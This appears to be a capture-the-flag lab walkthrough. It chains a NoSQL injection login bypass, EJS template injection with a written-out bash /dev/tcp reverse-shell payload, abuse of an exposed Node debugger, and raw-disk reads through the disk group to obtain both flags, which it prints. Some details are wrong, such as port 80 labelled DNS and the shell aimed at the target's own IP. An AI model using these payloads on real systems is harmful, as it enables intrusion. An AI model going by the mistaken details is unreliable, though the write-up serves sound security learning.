**Room 7 (Do Not Disturb) = boot2root - SSTI - RCE**



1. access the given `URL` to find a sign-in web form, username is pre-filled "attendant"
2. using `nmap scan` for open ports -> `port 22` (SSH) and `port 80` (DNS)
3. `gobuster dir -u` finds 3 directories: `/logout` , `/login` and `/staff`
4. `/staff` is `403 Unauthorized`, `/logout` redirects to `/login`
5. using a `NoSQL` injection `curl -c c.txt` to put in a `password\[$ne]=x`
6. when using the browser, fill the username: "attendant" and password: "x" and under Inspect change the `name="password"` to `name="password\[$ne]"`
7. the confirmation template in `/staff` is `EJS` (content between `<%= %>` gets executed) = `SSTI`
8. easiest way forward is to create a `reverse shell`, by starting a listener `nc -lvnp 4444`
• put this into the template, TARGET\_IP being the lab machine:
```
<%= global.process.mainModule.require('child\_process').execSync('bash -c "bash -i >\& /dev/tcp/TARGET\_IP/4444 0>\&1"') %>
```
9. the 1st flag will most likely be in "user.txt", so I search for it through the reverse shell
10. 1st flag located via `cat /home/poolside/user.txt` -> flag: ***THM{w4rm\_s3ss10n\_h1j4ck3d}***
11. `ps aux` shows a 2nd service as another user with a debugger open: `pipelinesvc node --inspect=127.0.0.1:9229 processor.js`
12. `--inspect` = unauthenticated `RCE` for anything on `localhost`
13. grab the debugger's `WebSocket URL`: `curl -s http://127.0.0.1:9229/json/list` -> `webSocketDebuggerUrl`
14. start 2nd listener `nc -lvnp 4445`, then run a small node script (v22 has global fetch/WebSocket) that hits the debugger and uses `Runtime.evaluate` to fire a reverse shell inside the `pipelinesvc` process
15. catch shell -> id = `pipelinesvc`
16. id shows `groups=995(pipelinesvc)`,6(disk) -> disk group = raw block-device read, bypasses file permissions
17. read `root` flag straight off the disk: `debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1` (fallback: `dd if=/dev/nvme0n1p1 | strings | grep THM`)
18. 2nd flag located in "root.txt" -> flag: ***THM{r4w\_d1sk\_4cc3ss\_w4s\_t00\_much}*** 

`gobuster dir -> access /staff through NoSQL injection -> reverse Shell -> 1st flag -> find elevation through ps aux -> pipelinescv -> 2nd flag`